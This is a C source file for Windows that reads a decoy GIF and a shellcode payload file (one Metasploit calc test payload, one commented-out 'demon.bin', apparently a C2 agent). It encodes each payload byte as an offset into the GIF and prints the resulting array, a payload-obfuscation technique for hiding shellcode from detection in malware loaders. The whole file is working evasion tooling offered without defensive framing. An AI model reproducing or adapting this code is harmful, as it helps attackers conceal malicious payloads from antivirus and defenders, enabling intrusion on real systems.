#include <Windows.h>
#include <stdio.h>



BOOL ReadFileFromDiskW(IN LPCWSTR szFileName, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize) {

	HANDLE		hFile					= INVALID_HANDLE_VALUE;
	DWORD		dwFileSize				= NULL,
				dwNumberOfBytesRead		= NULL;
	PBYTE		pBaseAddress			= NULL;

	if (!szFileName || !pdwFileSize || !ppFileBuffer)
		goto _END_OF_FUNC;

	if ((hFile = CreateFileW(szFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pBaseAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!ReadFile(hFile, pBaseAddress, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error: %d \n[i] Read %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesRead, dwFileSize);
		goto _END_OF_FUNC;
	}

	*ppFileBuffer	= pBaseAddress;
	*pdwFileSize	= dwFileSize;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (pBaseAddress && !*ppFileBuffer)
		HeapFree(GetProcessHeap(), 0x00, pBaseAddress);
	return (*ppFileBuffer && *pdwFileSize) ? TRUE : FALSE;
}



#define		DUMMY_FILE		L"C:\\Users\\NULL0x00\\Desktop\\dummygif.gif"

//\
#define		PAYLOAD_FILE	L"C:\\Users\\NULL0x00\\Documents\\Payloads\\demon.bin"
//
#define		PAYLOAD_FILE	L"C:\\Users\\NULL0x00\\Documents\\Payloads\\MsfCalcx64.bin"


int main() {

	PBYTE		uDummyFileBuffer	= NULL,
				uPayloadFileBuffer	= NULL;

	DWORD		dwDummyFileSize		= 0x00,
				dwPayloadFileSize	= 0x00;

	PDWORD		pdwOffsetsArray		= NULL;


	if (!ReadFileFromDiskW(DUMMY_FILE, &uDummyFileBuffer, &dwDummyFileSize))
		return -1;

	if (!ReadFileFromDiskW(PAYLOAD_FILE, &uPayloadFileBuffer, &dwPayloadFileSize))
		return -1;


	if (!(pdwOffsetsArray = (PDWORD)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPayloadFileSize * sizeof(DWORD))))
		return -1;


	for (DWORD i = 0; i < dwPayloadFileSize; i++)
		pdwOffsetsArray[i] = (DWORD)-1;

	for (DWORD i = 0; i < dwPayloadFileSize; i++) {

		for (DWORD x = 0; x < dwDummyFileSize; x++) {

			if (uPayloadFileBuffer[i] == uDummyFileBuffer[x]) {
				pdwOffsetsArray[i] = (DWORD)x;
				break;
			}

		}
	}

	for (DWORD i = 0; i < dwPayloadFileSize; i++) {
		if (pdwOffsetsArray[i] == (DWORD)-1) {
			printf("[i] Cound'nt Find Byte Of Offset '%d' Of The Payload In The Provided Dummy File \n", i);
			return -1;
		}
	}


	printf("DWORD dwOffsetsArray[%d] = { \n", dwPayloadFileSize);

	for (DWORD i = 0; i < dwPayloadFileSize; i++) {

		if (i % 16 == 0)
			printf("\n\t");

		if (i == dwPayloadFileSize - 1)
			printf("%d", (DWORD)pdwOffsetsArray[i]);
		else
			printf("%d, ", (DWORD)pdwOffsetsArray[i]);

	}

	printf("\n};\n");
}
